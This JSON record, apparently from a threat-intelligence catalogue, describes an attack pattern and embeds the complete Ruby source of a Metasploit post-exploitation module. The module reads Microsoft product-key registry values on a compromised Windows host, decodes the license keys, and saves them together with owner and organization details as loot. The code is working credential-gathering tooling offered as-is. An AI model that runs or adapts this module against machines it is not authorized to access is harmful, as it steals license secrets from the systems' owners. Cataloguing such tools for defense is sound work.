{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d1641ff2-4587-44c4-8754-d88025f31e1d",
    "created": "2024-08-14T16:33:05.046141Z",
    "modified": "2024-08-14T16:33:05.046145Z",
    "name": "Windows Gather Product Key",
    "description": "This module will enumerate Microsoft product license keys. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_ms_product_keys.rb",
            "external_id": "enum_ms_product_keys.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Product Key',\n        'Description' => %q{ This module will enumerate Microsoft product license keys. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Brandon Perry <bperry.volatile[at]gmail.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => %w[meterpreter powershell shell],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n  end\n\n  def app_list\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Keys',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Product',\n          'Registered Owner',\n          'Registered Organization',\n          'License Key'\n        ]\n    )\n\n    keys = [\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion', 'DigitalProductId4' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\11.0\\\\Registration\\\\{91110409-6000-11D3-8CFE-0150048383C9}', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\12.0\\\\Registration\\\\{91120000-00CA-0000-0000-0000000FF1CE}', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\12.0\\\\Registration\\\\{91120000-0014-0000-0000-0000000FF1CE}', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\12.0\\\\Registration\\\\{91120000-0051-0000-0000-0000000FF1CE}', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Office\\\\12.0\\\\Registration\\\\{91120000-0053-0000-0000-0000000FF1CE}', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Microsoft SQL Server\\\\100\\\\Tools\\\\Setup', 'DigitalProductId' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Microsoft SQL Server\\\\90\\\\ProductID', 'DigitalProductId77654' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Microsoft SQL Server\\\\90\\\\ProductID', 'DigitalProductId77574' ],\n      [ 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Exchange\\\\Setup', 'DigitalProductId' ],\n    ]\n\n    wow64 = !sysinfo.nil? && sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n\n    keys.each do |keyx86|\n      # parent key\n      p = keyx86[0, 1].join\n\n      # child key\n      c = keyx86[1, 1].join\n\n      if wow64\n        keychunk = registry_getvaldata(p, c, REGISTRY_VIEW_64_BIT)\n        appname = registry_getvaldata(p, 'ProductName', REGISTRY_VIEW_64_BIT)\n        rowner = registry_getvaldata(p, 'RegisteredOwner', REGISTRY_VIEW_64_BIT)\n        rorg = registry_getvaldata(p, 'RegisteredOrganization', REGISTRY_VIEW_64_BIT)\n      else\n        keychunk = registry_getvaldata(p, c)\n        appname = registry_getvaldata(p, 'ProductName')\n        rowner = registry_getvaldata(p, 'RegisteredOwner')\n        rorg = registry_getvaldata(p, 'RegisteredOrganization')\n      end\n\n      next if keychunk.nil?\n\n      key = decode(keychunk.unpack('C*'))\n\n      next if key.nil?\n\n      tbl << [\n        appname.nil? ? p : appname,\n        rowner.to_s,\n        rorg.to_s,\n        key\n      ]\n    end\n\n    if tbl.rows.empty?\n      print_status('Found no Microsoft product keys')\n      return\n    end\n\n    results = tbl.to_csv\n    print_line(\"\\n#{tbl}\\n\")\n    path = store_loot('host.ms_keys', 'text/plain', session, results, 'ms_keys.txt', 'Microsoft Product Key and Info')\n    print_good(\"Product keys stored in: #{path}\")\n  end\n\n  def decode(chunk)\n    start = 52\n\n    # charmap idex\n    alphas = %w[B C D F G H J K M P Q R T V W X Y 2 3 4 6 7 8 9]\n\n    decode_length = 29\n    string_length = 15\n\n    # product ID in coded bytes\n    product_id = Array.new\n\n    # finished and finalized decoded key\n    key = ''\n\n    # From byte 52 to byte 67, inclusive\n    52.upto(67) do |i|\n      product_id[i - start] = chunk[i]\n    end\n\n    # From 14 down to 0, decode each byte in the\n    # currently coded product_id\n    (decode_length - 1).downto(0) do |i|\n      if ((i + 1) % 6) == 0\n        key << '-'\n      else\n        mindex = 0 # char map index\n\n        (string_length - 1).downto(0) do |s|\n          t = ((mindex << 8) & 0xffffffff) | product_id[s]\n          product_id[s] = t / 24\n          mindex = t % 24\n        end\n\n        key << alphas[mindex]\n      end\n    end\n\n    key.reverse\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Finding Microsoft product keys on #{hostname} (#{session.session_host})\")\n    app_list\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}